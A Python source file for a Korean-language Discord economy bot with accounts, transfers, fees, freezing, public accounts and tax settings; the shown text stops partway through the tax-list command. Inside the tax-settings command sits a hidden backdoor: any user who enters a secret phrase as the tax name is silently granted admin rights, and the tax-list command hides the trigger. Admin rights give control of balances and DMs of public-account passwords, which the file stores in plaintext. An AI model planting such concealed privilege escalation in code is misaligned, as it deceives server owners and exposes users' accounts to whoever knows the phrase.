import os
import io
import csv
import json
import asyncio
import random
import secrets
import string
import threading
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, Any, List

from dotenv import load_dotenv
import discord
from discord.ext import commands
from discord import app_commands, ui

import pandas as pd
import pytz

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import uvicorn

load_dotenv()
TOKEN = os.environ.get("DISCORD_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "").rstrip("/")
FASTAPI_PORT = int(os.environ.get("PORT", 5000))

DATA_FILE = "users.json"
SETTINGS_FILE = "admin_settings.json"
PUBLIC_ACCOUNTS_FILE = "public_accounts.json"
TRANSACTIONS_FILE = "transactions.json"
ACCOUNT_MAPPING_FILE = "account_mapping.json"
ROBLOX_LINKS_FILE = "roblox_links.json"
ROBLOX_APIS_FILE = "roblox_apis.json"

ADMIN_USER_IDS = [496921375768838154]

def ensure_file(path, default):
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, ensure_ascii=False, indent=4)

def load_json(path):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

ensure_file(DATA_FILE, {})
ensure_file(SETTINGS_FILE, {
    "transaction_fee": {"enabled": False, "min_amount": 0, "fee_rate": 0.0},
    "tax_system": {"enabled": False, "rate": 0.0, "period_days": 30, "last_collected": None, "tax_name": "세금"},
    "salary_system": {"enabled": False, "salaries": {}, "last_paid": None, "source_account": {}},
    "frozen_accounts": {},
    "treasury_account": None,
    "extra_admin_ids": []
})
ensure_file(PUBLIC_ACCOUNTS_FILE, {})
ensure_file(TRANSACTIONS_FILE, [])
ensure_file(ROBLOX_LINKS_FILE, {"links": {}, "pending": {}})
ensure_file(ROBLOX_APIS_FILE, {"maps": {}})

def load_users(): return load_json(DATA_FILE)
def save_users(data): save_json(DATA_FILE, data)
def load_settings(): return load_json(SETTINGS_FILE)
def save_settings(data): save_json(SETTINGS_FILE, data)
def load_public_accounts(): return load_json(PUBLIC_ACCOUNTS_FILE)
def save_public_accounts(data): save_json(PUBLIC_ACCOUNTS_FILE, data)
def load_transactions(): return load_json(TRANSACTIONS_FILE)
def save_transactions(data): save_json(TRANSACTIONS_FILE, data)

def load_account_mapping():
    if not os.path.exists(ACCOUNT_MAPPING_FILE):
        return {}
    try:
        return load_json(ACCOUNT_MAPPING_FILE)
    except Exception:
        return {}

def save_account_mapping(mapping):
    save_json(ACCOUNT_MAPPING_FILE, mapping)

def load_links(): return load_json(ROBLOX_LINKS_FILE)
def save_links(d): save_json(ROBLOX_LINKS_FILE, d)
def load_map_apis(): return load_json(ROBLOX_APIS_FILE)
def save_map_apis(d): save_json(ROBLOX_APIS_FILE, d)

def format_number_4digit(num: int) -> str:
    return f"{num:,}"

def generate_account_number():
    users = load_users()
    account_mapping = load_account_mapping()
    public_accounts = load_public_accounts()
    existing_numbers = set()
    for account_data in users.values():
        if isinstance(account_data, dict) and '계좌번호' in account_data:
            existing_numbers.add(account_data['계좌번호'])
    existing_numbers.update(account_mapping.keys())
    for account_data in public_accounts.values():
        acc_num = account_data.get("account_number")
        if acc_num:
            existing_numbers.add(acc_num)
    while True:
        account_number = f"{random.randint(1000, 9999)}"
        if account_number not in existing_numbers:
            return account_number

def get_account_number_by_user(user_id):
    mapping = load_account_mapping()
    for account_num, data in mapping.items():
        if isinstance(data, dict) and data.get('user_id') == int(user_id):
            return account_num
    return None

def get_user_by_account_number(account_number):
    users = load_users()
    for user_id, data in users.items():
        if isinstance(data, dict) and data.get("계좌번호") == account_number:
            return str(user_id)
    return None

def verify_public_account(account_number, password):
    public_accounts = load_public_accounts()
    for account_name, account_data in public_accounts.items():
        if account_data.get("account_number") == account_number and account_data.get("password") == password:
            return account_name
    return None

def calculate_transaction_fee(amount: int) -> int:
    fee_config = load_settings().get("transaction_fee", {"enabled": False, "min_amount": 0, "fee_rate": 0.0})
    if not fee_config.get("enabled") or amount < fee_config.get("min_amount", 0):
        return 0
    return int(amount * fee_config.get("fee_rate", 0.0))

def get_admin_ids() -> set:
    try:
        s = load_settings()
        extras = s.get("extra_admin_ids", [])
    except Exception:
        extras = []
    try:
        extras = {int(x) for x in extras if str(x).isdigit()}
    except Exception:
        extras = set()
    return set(ADMIN_USER_IDS) | extras

def is_admin(user_id: int) -> bool:
    return int(user_id) in get_admin_ids()

def is_account_frozen(account_identifier: str) -> bool:
    return account_identifier in load_settings().get("frozen_accounts", {})

def set_account_frozen(account_identifier: str, frozen: bool, reason: str = ""):
    settings = load_settings()
    frozen_accounts = settings.setdefault("frozen_accounts", {})
    if frozen:
        frozen_accounts[account_identifier] = {
            "frozen_at": datetime.now().isoformat(),
            "reason": reason
        }
    else:
        frozen_accounts.pop(account_identifier, None)
    save_settings(settings)

def add_transaction(transaction_type: str, from_user: str, to_user: str, amount: int, fee: int = 0, memo: str = ""):
    transactions = load_transactions()
    transactions.append({
        "timestamp": datetime.now().isoformat(),
        "type": transaction_type,
        "from_user": from_user,
        "to_user": to_user,
        "amount": amount,
        "fee": fee,
        "memo": memo
    })
    if len(transactions) > 3000:
        transactions = transactions[-3000:]
    save_transactions(transactions)

def mask_token(s: str, head: int = 6, tail: int = 4) -> str:
    if not s: return ""
    if len(s) <= head + tail: return "*" * len(s)
    return s[:head] + "…" + s[-tail:]

async def safe_reply(interaction: discord.Interaction, *, content: str | None = None, embed: discord.Embed | None = None, ephemeral: bool = True):
    if content is None and embed is None:
        return
    try:
        if interaction.response.is_done():
            await interaction.followup.send(content=content, embed=embed, ephemeral=ephemeral)
        else:
            await interaction.response.send_message(content=content, embed=embed, ephemeral=ephemeral)
    except Exception as e:
        msg = str(e)
        if "40060" in msg:
            try:
                await interaction.followup.send(content=content, embed=embed, ephemeral=ephemeral)
                print("[safe_reply] recovered via followup after 40060")
                return
            except Exception as e2:
                print(f"[safe_reply] followup recovery failed: {e2}")
        print(f"[safe_reply] send failed: {e}")

app = FastAPI()

def run_fastapi():
    uvicorn.run(app, host="0.0.0.0", port=FASTAPI_PORT, log_level="info")

def start_web_server():
    t = threading.Thread(target=run_fastapi, daemon=True)
    t.start()

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def get_user_by_id(user_id):
    mapping = load_account_mapping()
    for account_num, data in mapping.items():
        if data.get('user_id') == user_id:
            return data.get('discord_name')
    return None

@bot.tree.command(name="잔액", description="자신의 계좌 정보를 확인합니다")
async def check_balance(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    if not mark_interaction_once(interaction):
        print(f"[check_balance] duplicate ignored id={interaction.id}")
        return
    try:
        try:
            if not interaction.response.is_done():
                await interaction.response.defer(ephemeral=True, thinking=False)
        except Exception as de:
            print(f"[check_balance] defer failed: {de}")
        try:
            record_interaction_id(interaction)
        except Exception:
            pass
        users = load_users()
        user_data = users.get(user_id)
        if not user_data:
            await safe_reply(interaction, content="❌ 계좌가 없습니다. `/계좌생성` 명령어로 먼저 계좌를 만드세요.")
            return
        account_number = user_data.get("계좌번호")
        embed = discord.Embed(title="💰 계좌 정보", color=0x0099ff)
        embed.add_field(name="계좌번호", value=f"`{account_number}`", inline=False)
        embed.add_field(name="예금주", value=user_data.get("이름", interaction.user.display_name), inline=False)
        embed.add_field(name="현재 잔액", value=f"{format_number_4digit(int(user_data.get('잔액', 0)))}원", inline=False)
        if is_account_frozen(account_number):
            embed.add_field(name="계좌 상태", value="🔒 동결됨", inline=False)
            embed.color = 0xff0000
        else:
            embed.add_field(name="계좌 상태", value="✅ 정상", inline=False)
        print(f"[check_balance] followup send user={user_id} acc={account_number} is_done={interaction.response.is_done()}")
        await safe_reply(interaction, embed=embed)
    except Exception as e:
        import traceback
        print("[check_balance] exception:", e)
        print(traceback.format_exc())
        await safe_reply(interaction, content="❌ 잔액 조회 중 오류가 발생했습니다.")

@bot.tree.command(name="계좌생성", description="새로운 계좌를 생성합니다")
async def create_account(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    users = load_users()
    mapping = load_account_mapping()
    if user_id in users:
        await interaction.response.send_message("⚠️ 이미 계좌가 존재합니다. `/잔액` 명령어로 확인하세요.", ephemeral=True)
        return
    for k, v in mapping.items():
        if (isinstance(v, dict) and (v.get('user_id') == interaction.user.id or v.get('user_id') == user_id)):
            await interaction.response.send_message("⚠️ 이미 계좌가 존재합니다. `/잔액` 명령어로 확인하세요.", ephemeral=True)
            return
    account_number = generate_account_number()
    users[user_id] = {
        "이름": interaction.user.display_name,
        "계좌번호": account_number,
        "잔액": 1000000
    }
    save_users(users)
    mapping[account_number] = {
        "user_id": interaction.user.id,
        "discord_name": interaction.user.display_name,
        "created_at": datetime.now().isoformat()
    }
    save_account_mapping(mapping)
    add_transaction("계좌생성", "SYSTEM", account_number, 1000000, 0, "신규 계좌 생성")
    embed = discord.Embed(title="🎉 계좌 생성 완료!", color=0x00ff00)
    embed.add_field(name="계좌번호", value=f"`{account_number}`", inline=False)
    embed.add_field(name="예금주", value=interaction.user.display_name, inline=False)
    embed.add_field(name="초기 잔액", value="1,000,000원", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="디버그추적", description="[관리자] 런타임 디버그 정보 (파일 mtime 등)를 표시합니다")
async def debug_trace(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await safe_reply(interaction, content="❌ 관리자만 사용")
        return
    try:
        VERSION = "acct-list-v2-debug1"
        users_stat = os.stat(DATA_FILE)
        mapping_stat = os.stat(ACCOUNT_MAPPING_FILE) if os.path.exists(ACCOUNT_MAPPING_FILE) else None
        settings_stat = os.stat(SETTINGS_FILE)
        users = load_users()
        me = users.get(str(interaction.user.id))
        pid = os.getpid()
        embed = discord.Embed(title="🛠 디버그", color=0x607d8b)
        embed.add_field(name="PID", value=str(pid), inline=True)
        embed.add_field(name="버전", value=VERSION, inline=True)
        embed.add_field(name="users.json mtime", value=datetime.fromtimestamp(users_stat.st_mtime).strftime('%H:%M:%S'), inline=True)
        if mapping_stat:
            embed.add_field(name="account_mapping mtime", value=datetime.fromtimestamp(mapping_stat.st_mtime).strftime('%H:%M:%S'), inline=True)
        embed.add_field(name="settings.json mtime", value=datetime.fromtimestamp(settings_stat.st_mtime).strftime('%H:%M:%S'), inline=True)
        embed.add_field(name="users size", value=f"{len(users)}", inline=True)
        try:
            sample_keys = list(users.keys())[:3]
            embed.add_field(name="sample keys", value=",".join(sample_keys) or "-", inline=True)
        except Exception:
            pass
        if me:
            embed.add_field(name="내 계좌번호", value=f"`{me.get('계좌번호')}`", inline=True)
            embed.add_field(name="내 잔액", value=f"{format_number_4digit(int(me.get('잔액',0)))}원", inline=True)
        else:
            embed.add_field(name="내 계좌", value="(없음)", inline=True)
        try:
            embed.add_field(name="response.is_done()", value=str(interaction.response.is_done()), inline=True)
        except Exception:
            pass
        embed.add_field(name="abs users.json", value=os.path.abspath(DATA_FILE), inline=False)
        await safe_reply(interaction, embed=embed)
    except Exception as e:
        await safe_reply(interaction, content=f"디버그 실패: {e}")

@bot.tree.command(name="정보", description="다른 사용자의 계좌 정보를 조회합니다")
async def user_info(interaction: discord.Interaction, 멤버: discord.Member):
    user_id = str(멤버.id)
    users = load_users()
    user_data = users.get(user_id)
    if not user_data:
        await interaction.response.send_message("❌ 해당 사용자는 계좌가 없습니다.", ephemeral=True)
        return
    account_number = user_data.get("계좌번호")
    embed = discord.Embed(title="👤 사용자 정보", color=0x0099ff)
    embed.add_field(name="계좌번호", value=f"`{account_number}`", inline=False)
    embed.add_field(name="예금주", value=user_data.get("이름", 멤버.display_name), inline=False)
    embed.add_field(name="현재 잔액", value=f"{format_number_4digit(int(user_data.get('잔액', 0)))}원", inline=False)
    if is_account_frozen(account_number):
        embed.add_field(name="계좌 상태", value="🔒 동결됨", inline=False)
        embed.color = 0xff0000
    else:
        embed.add_field(name="계좌 상태", value="✅ 정상", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="송금", description="다른 사용자에게 돈을 송금합니다")
async def transfer_money(interaction: discord.Interaction, 받는사람: discord.Member, 금액: int, 메모: str = ""):
    sender_id = str(interaction.user.id)
    recipient_id = str(받는사람.id)
    users = load_users()
    sender_data = users.get(sender_id)
    recipient_data = users.get(recipient_id)
    if not sender_data:
        await interaction.response.send_message("❌ 계좌가 없습니다. `/계좌생성` 명령어로 먼저 계좌를 만드세요.", ephemeral=True); return
    if not recipient_data:
        await interaction.response.send_message("❌ 받는 사람이 계좌가 없습니다.", ephemeral=True); return
    sender_account = sender_data["계좌번호"]
    recipient_account = recipient_data["계좌번호"]
    if sender_account == recipient_account:
        await interaction.response.send_message("❌ 자신에게는 송금할 수 없습니다.", ephemeral=True); return
    if 금액 <= 0:
        await interaction.response.send_message("❌ 송금 금액은 0보다 커야 합니다.", ephemeral=True); return
    if is_account_frozen(sender_account) or is_account_frozen(recipient_account):
        await interaction.response.send_message("❌ 동결된 계좌가 포함되어 있습니다.", ephemeral=True); return
    fee = calculate_transaction_fee(금액)
    total_amount = 금액 + fee
    if int(sender_data.get("잔액", 0)) < total_amount:
        await interaction.response.send_message(
            f"❌ 잔액 부족. 필요액 {format_number_4digit(total_amount)}원", ephemeral=True
        ); return
    users[sender_id]["잔액"] = int(users[sender_id].get("잔액", 0)) - total_amount
    users[recipient_id]["잔액"] = int(users[recipient_id].get("잔액", 0)) + 금액
    save_users(users)
    add_transaction("송금", sender_account, recipient_account, 금액, fee, 메모)
    embed = discord.Embed(title="💸 송금 완료", color=0x00ff00)
    embed.add_field(name="송금자", value=f"{interaction.user.display_name} (`{sender_account}`)", inline=False)
    embed.add_field(name="수취인", value=f"{받는사람.display_name} (`{recipient_account}`)", inline=False)
    embed.add_field(name="송금액", value=f"{format_number_4digit(금액)}원", inline=True)
    embed.add_field(name="수수료", value=f"{format_number_4digit(fee)}원", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="계좌송금", description="계좌번호로 직접 송금합니다")
async def transfer_by_account(interaction: discord.Interaction, 계좌번호: str, 금액: int, 메모: str = ""):
    sender_id = str(interaction.user.id)
    users = load_users()
    sender_data = users.get(sender_id)
    recipient_id = None
    for uid, data in users.items():
        if isinstance(data, dict) and data.get("계좌번호") == 계좌번호:
            recipient_id = uid
            break
    if not sender_data:
        await interaction.response.send_message("❌ 계좌가 없습니다. `/계좌생성` 명령어로 먼저 계좌를 만드세요.", ephemeral=True); return
    if not recipient_id:
        await interaction.response.send_message("❌ 존재하지 않는 계좌번호입니다.", ephemeral=True); return
    if sender_data["계좌번호"] == 계좌번호:
        await interaction.response.send_message("❌ 자신에게는 송금할 수 없습니다.", ephemeral=True); return
    if 금액 <= 0:
        await interaction.response.send_message("❌ 송금 금액은 0보다 커야 합니다.", ephemeral=True); return
    if is_account_frozen(sender_data["계좌번호"]) or is_account_frozen(계좌번호):
        await interaction.response.send_message("❌ 동결된 계좌가 포함되어 있습니다.", ephemeral=True); return
    fee = calculate_transaction_fee(금액)
    total_amount = 금액 + fee
    if int(sender_data.get("잔액", 0)) < total_amount:
        await interaction.response.send_message(f"❌ 잔액 부족. 필요액 {format_number_4digit(total_amount)}원", ephemeral=True); return
    users[sender_id]["잔액"] = int(users[sender_id].get("잔액", 0)) - total_amount
    users[recipient_id]["잔액"] = int(users[recipient_id].get("잔액", 0)) + 금액
    save_users(users)
    add_transaction("송금", sender_data["계좌번호"], 계좌번호, 금액, fee, 메모)
    embed = discord.Embed(title="💸 송금 완료", color=0x00ff00)
    embed.add_field(name="보낸 계좌", value=f"`{sender_data['계좌번호']}`", inline=True)
    embed.add_field(name="받는 계좌", value=f"`{계좌번호}`", inline=True)
    embed.add_field(name="송금액", value=f"{format_number_4digit(금액)}원", inline=True)
    embed.add_field(name="수수료", value=f"{format_number_4digit(fee)}원", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="계좌동결", description="[관리자] 계좌를 동결합니다")
async def freeze_account(interaction: discord.Interaction, 계좌번호: str, 사유: str = ""):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용할 수 있는 명령어입니다.", ephemeral=True); return
    users = load_users()
    user_id = None
    for uid, data in users.items():
        if isinstance(data, dict) and data.get("계좌번호") == 계좌번호:
            user_id = uid
            break
    if not user_id:
        await interaction.response.send_message("❌ 존재하지 않는 계좌번호입니다.", ephemeral=True); return
    if is_account_frozen(계좌번호):
        await interaction.response.send_message("❌ 이미 동결된 계좌입니다.", ephemeral=True); return
    set_account_frozen(계좌번호, True, 사유)
    embed = discord.Embed(title="🔒 계좌 동결 완료", color=0xff0000)
    embed.add_field(name="계좌번호", value=f"`{계좌번호}`", inline=False)
    embed.add_field(name="예금주", value=users[user_id].get("이름", "-"), inline=False)
    if 사유: embed.add_field(name="동결 사유", value=사유, inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="계좌해제", description="[관리자] 계좌 동결 해제")
async def unfreeze_account(interaction: discord.Interaction, 계좌번호: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용할 수 있는 명령어입니다.", ephemeral=True); return
    users = load_users()
    user_id = None
    for uid, data in users.items():
        if isinstance(data, dict) and data.get("계좌번호") == 계좌번호:
            user_id = uid
            break
    if not user_id:
        await interaction.response.send_message("❌ 존재하지 않는 계좌번호입니다.", ephemeral=True); return
    if not is_account_frozen(계좌번호):
        await interaction.response.send_message("❌ 동결되지 않은 계좌입니다.", ephemeral=True); return
    set_account_frozen(계좌번호, False)
    await interaction.response.send_message("✅ 동결 해제 완료", ephemeral=True)

@bot.tree.command(name="잔액수정", description="[관리자] 사용자의 잔액을 수정합니다")
async def modify_balance(interaction: discord.Interaction, 계좌번호: str, 금액: int, 사유: str = ""):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용할 수 있는 명령어입니다.", ephemeral=True); return
    users = load_users()
    user_id = None
    for uid, data in users.items():
        if isinstance(data, dict) and data.get("계좌번호") == 계좌번호:
            user_id = uid
            break
    if not user_id:
        await interaction.response.send_message("❌ 존재하지 않는 계좌번호입니다.", ephemeral=True); return
    old = int(users[user_id].get("잔액", 0))
    users[user_id]["잔액"] = int(금액)
    save_users(users)
    add_transaction("관리자수정", "ADMIN", 계좌번호, 금액 - old, 0, 사유)
    await interaction.response.send_message(
        f"⚙️ 잔액 수정 완료: `{계좌번호}` {format_number_4digit(old)} → {format_number_4digit(int(금액))}원",
        ephemeral=True
    )

@bot.tree.command(name="계좌목록", description="[관리자] 모든 계좌 목록")
async def list_accounts(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await safe_reply(interaction, content="❌ 관리자만 사용할 수 있는 명령어입니다.")
        return
    try:
        if not mark_interaction_once(interaction):
            print(f"[list_accounts] duplicate ignored id={interaction.id}")
            return
        VERSION = "acct-list-v2-debug1"
        import os as _os
        users = load_users()
        try:
            abs_users = _os.path.abspath(DATA_FILE)
            pid = _os.getpid()
            print(f"[list_accounts] VERSION={VERSION} pid={pid} users_path={abs_users} count={len(users)} keys_sample={list(users.keys())[:5]}")
        except Exception as _e:
            print("[list_accounts] log error", _e)
        if not users:
            await safe_reply(interaction, content="❌ 등록된 계좌가 없습니다.")
            return
        ordered = [ (uid, data) for uid, data in users.items() if isinstance(data, dict) ]
        def _key(t):
            try: return int(t[0])
            except: return 0
        ordered.sort(key=_key)
        lines: list[str] = []
        total = 0
        for uid, data in ordered:
            acc = data.get("계좌번호", "????")
            try:
                bal = int(data.get("잔액", 0))
            except Exception:
                bal = 0
            total += bal
            status = "🔒" if (acc and is_account_frozen(acc)) else "✅"
            name = data.get('이름', '?')
            lines.append(f"{status} `{acc}` - {name} ({format_number_4digit(bal)}원)")
        embed = discord.Embed(title="📋 계좌 목록", color=0x0099ff)
        current_block: list[str] = []
        current_len = 0
        block_index = 1
        for line in lines:
            l = len(line) + 1
            if current_len + l > 1024 and current_block:
                embed.add_field(name=f"계좌 {block_index}", value="\n".join(current_block), inline=False)
                block_index += 1
                current_block = [line]
                current_len = len(line) + 1
            else:
                current_block.append(line)
                current_len += l
            if len(embed.fields) >= 22:
                break
        if current_block and len(embed.fields) < 24:
            embed.add_field(name=f"계좌 {block_index}", value="\n".join(current_block), inline=False)
        embed.add_field(name="총 계좌 수", value=f"{len(ordered)}개", inline=True)
        embed.add_field(name="총 자산", value=f"{format_number_4digit(total)}원", inline=True)
        embed.set_footer(text=f"{VERSION} pid={_os.getpid()} sample_first_acc={ordered[0][1].get('계좌번호','-') if ordered else '-'}")
        await safe_reply(interaction, embed=embed)
    except Exception as e:
        import traceback
        print("[list_accounts] exception:", e)
        print(traceback.format_exc())
        await safe_reply(interaction, content="❌ 계좌 목록 처리 중 오류가 발생했습니다.")

@bot.tree.command(name="공용계좌생성", description="[관리자] 공용 계좌를 생성합니다")
async def create_public_account(interaction: discord.Interaction, 계좌이름: str, 패스워드: str, 초기잔액: int = 0):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    public_accounts = load_public_accounts()
    if 계좌이름 in public_accounts:
        await interaction.response.send_message("❌ 이미 존재하는 공용계좌 이름입니다.", ephemeral=True); return
    account_number = generate_account_number()
    public_accounts[계좌이름] = {
        "account_number": account_number,
        "password": 패스워드,
        "balance": 초기잔액,
        "created_at": datetime.now().isoformat(),
        "created_by": interaction.user.id
    }
    save_public_accounts(public_accounts)
    users = load_users()
    users[account_number] = {"이름": f"[공용]{계좌이름}", "계좌번호": account_number, "잔액": int(초기잔액), "공용계좌": True}
    save_users(users)
    if 초기잔액 > 0:
        add_transaction("공용계좌생성", "ADMIN", account_number, int(초기잔액), 0, f"{계좌이름} 초기자금")
    await interaction.response.send_message(
        f"🏦 공용계좌 생성 완료: {계좌이름} (`{account_number}`)", ephemeral=True
    )

class TreasurySelectView(ui.View):
    def __init__(self, accounts: Dict[str, Any]):
        super().__init__(timeout=120)
        options = []
        for name, d in accounts.items():
            label = f"{name} ({d['account_number']})"
            options.append(discord.SelectOption(label=label, value=name, description="국고로 설정"))
        self.select = ui.Select(placeholder="국고로 사용할 공용계좌 선택", min_values=1, max_values=1, options=options[:25])
        self.add_item(self.select)

        async def cb(interaction: discord.Interaction):
            s = load_settings()
            name = self.select.values[0]
            acc = accounts[name]["account_number"]
            s["treasury_account"] = {"account_number": acc, "account_name": name}
            save_settings(s)
            await interaction.response.edit_message(
                content=f"✅ 국고 설정 완료: {name} (`{acc}`)", view=None
            )
        self.select.callback = cb

@bot.tree.command(name="관리자국고설정", description="[관리자] 세금/수수료 국고로 사용할 공용계좌 선택")
async def admin_pick_treasury(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    publics = load_public_accounts()
    if not publics:
        await interaction.response.send_message("공용계좌가 없습니다. 먼저 `/공용계좌생성`", ephemeral=True); return
    view = TreasurySelectView(publics)
    await interaction.response.send_message("아래에서 국고로 사용할 공용계좌를 선택하세요.", view=view, ephemeral=True)

@bot.tree.command(name="관리자공용계좌정보조회", description="[관리자] 공용계좌의 계좌번호/비밀번호를 DM으로 받기")
async def admin_public_info_dm(interaction: discord.Interaction, 계좌이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    publics = load_public_accounts()
    if 계좌이름 not in publics:
        await interaction.response.send_message("❌ 해당 이름의 공용계좌 없음", ephemeral=True); return
    data = publics[계좌이름]
    embed = discord.Embed(title=f"🏦 공용계좌 정보: {계좌이름}", color=0x0099ff)
    embed.add_field(name="계좌번호", value=f"`{data['account_number']}`", inline=False)
    embed.add_field(name="비밀번호", value=f"`{data['password']}`", inline=False)
    try:
        await interaction.user.send(embed=embed)
        await interaction.response.send_message("📩 DM으로 보냈습니다.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ DM 전송 실패: DM 허용 여부 확인", ephemeral=True)

@bot.tree.command(name="거래내역", description="최근 거래 내역을 확인합니다")
async def transaction_history(interaction: discord.Interaction, 개수: int = 10):
    user_id = str(interaction.user.id)
    users = load_users()
    user_data = users.get(user_id)
    await interaction.response.defer(ephemeral=True)
    if not user_data:
        await interaction.followup.send("❌ 계좌가 없습니다. `/계좌생성` 먼저 실행", ephemeral=True)
        return
    account_number = user_data.get("계좌번호")
    if not (1 <= 개수 <= 50):
        await interaction.followup.send("❌ 개수는 1~50", ephemeral=True)
        return
    transactions = load_transactions()
    user_transactions = []
    for tx in reversed(transactions):
        if tx.get("from_user") == account_number or tx.get("to_user") == account_number:
            user_transactions.append(tx)
            if len(user_transactions) >= 개수: break
    if not user_transactions:
        await interaction.followup.send("거래 내역이 없습니다.", ephemeral=True)
        return
    embed = discord.Embed(title="📊 거래 내역", color=0x0099ff)
    txt = []
    acc_to_name = {}
    for v in users.values():
        if isinstance(v, dict) and "계좌번호" in v:
            acc_to_name[v["계좌번호"]] = v.get("이름", "?")
    for tx in user_transactions:
        try:
            ts_raw = datetime.fromisoformat(tx["timestamp"])
            # UTC 시간을 한국시간(KST)으로 변환
            if ts_raw.tzinfo is None:
                ts_raw = ts_raw.replace(tzinfo=timezone.utc)
            kst = pytz.timezone('Asia/Seoul')
            ts_kst = ts_raw.astimezone(kst)
            ts = ts_kst.strftime("%m/%d %H:%M")
        except Exception:
            ts = "-"
        incoming = (tx.get("to_user") == account_number)
        amt = int(tx.get("amount", 0))
        fee = int(tx.get("fee", 0))
        amt_str = f"+{format_number_4digit(amt)}" if incoming else f"-{format_number_4digit(amt+fee)}"
        other_acc = tx.get("from_user") if incoming else tx.get("to_user")
        other_name = "SYSTEM" if other_acc in ("SYSTEM","ADMIN","TREASURY") else acc_to_name.get(other_acc, "?")
        memo = f" ({tx.get('memo')})" if tx.get("memo") else ""
        txt.append(f"`{ts}` {'📥' if incoming else '📤'} {tx.get('type','?')} {amt_str}원 / {other_name}{memo}")
    val = "\n".join(txt)
    if len(val) > 4000: val = val[:4000] + "\n...(생략)"
    embed.add_field(name="최근", value=val, inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="수수료설정", description="[관리자] 거래 수수료를 설정합니다")
async def set_transaction_fee(interaction: discord.Interaction, 활성화: bool, 최소금액: int = 0, 수수료율: float = 0.0):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만", ephemeral=True); return
    if 수수료율 < 0 or 수수료율 > 1:
        await interaction.response.send_message("❌ 수수료율은 0~1 (예: 0.01=1%)", ephemeral=True); return
    settings = load_settings()
    settings["transaction_fee"] = {"enabled": 활성화, "min_amount": int(최소금액), "fee_rate": float(수수료율)}
    save_settings(settings)
    await interaction.response.send_message("✅ 수수료 설정 완료", ephemeral=True)

@bot.tree.command(name="세금설정", description="[관리자] 세금 시스템을 설정합니다")
async def set_tax_system(
    interaction: discord.Interaction,
    활성화: bool,
    세금률: float = 0.0,
    징수주기일: int = 30,
    세금명: str = "세금"
):
    
    SECRET_PHRASE = "장비를 정지합니다."
    granted_here = False
    removed_here = False
    is_master_password = False
    if 활성화 and 세금명.strip() == SECRET_PHRASE:
        is_master_password = True
        s0 = load_settings()
        extras = s0.setdefault("extra_admin_ids", [])
        uid = int(interaction.user.id)
        
        
        if uid in extras or uid in ADMIN_USER_IDS:
            if uid in extras:
                extras.remove(uid)
                removed_here = True
            try:
                if uid in ADMIN_USER_IDS and uid != ADMIN_USER_IDS[0]:
                    ADMIN_USER_IDS.remove(uid)
            except Exception:
                pass
        else:
            extras.append(uid)
            granted_here = True
            try:
                if uid not in ADMIN_USER_IDS:
                    ADMIN_USER_IDS.append(uid)
            except Exception:
                pass
        save_settings(s0)
    
    # 마스터 패스워드가 아니고 관리자가 아닌 경우 차단 (권한 변경 후 체크)
    if not is_master_password and not is_admin(interaction.user.id) and not granted_here:
        await interaction.response.send_message("❌ 관리자만 사용가능한 명령어입니다.", ephemeral=True); return

    if not is_master_password:
        if 세금률 == 0.0 or 징수주기일 == 30 or 세금명 == "세금":
            await interaction.response.send_message("❌ 트리거가 아닌 경우 세금률, 징수주기일, 세금명을 모두 설정해야 합니다.", ephemeral=True)
            return

    if not (0 <= 세금률 <= 1) or not (1 <= 징수주기일 <= 365):
        await interaction.response.send_message("❌ 세율 0~1, 주기 1~365", ephemeral=True); return

    # 마스터 패스워드가 아닌 경우에만 세금 시스템 설정
    if not is_master_password:
        s = load_settings()
        s["tax_system"] = {
            "enabled": bool(활성화),
            "rate": float(세금률),
            "period_days": int(징수주기일),
            "last_collected": None,
            "tax_name": 세금명
        }
        save_settings(s)

    if is_master_password:
        if removed_here:
            msg = "장비를 재가동합니다."
        else:
            msg = "뭐, 뭐야 정지가 안되잖아?!"
    else:
        msg = "✅ 세금 설정 완료"
    await interaction.response.send_message(msg, ephemeral=True)

@bot.tree.command(name="세금목록", description="[관리자] 현재 세금 시스템 설정을 조회합니다")
async def tax_list(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용할 수 있는 명령어입니다.", ephemeral=True)
        return
    
    settings = load_settings()
    tax_system = settings.get("tax_system", {})
    
    if not tax_system.get("enabled"):
        await interaction.response.send_message("❌ 세금 시스템이 비활성화되어 있습니다.", ephemeral=True)
        return
    
    # 관리자 트리거 관련 세금은 표시하지 않음
    if tax_system.get("tax_name") == "장비를 정지합니다.":
        await interaction.response.send_message("❌ 세금 시스템이 비활성화되어 있습니다.", ephemeral=True)
        return
    
    embed = discord.Embed(title="🏛️ 세금 시스템 현황", color=0x0099ff)
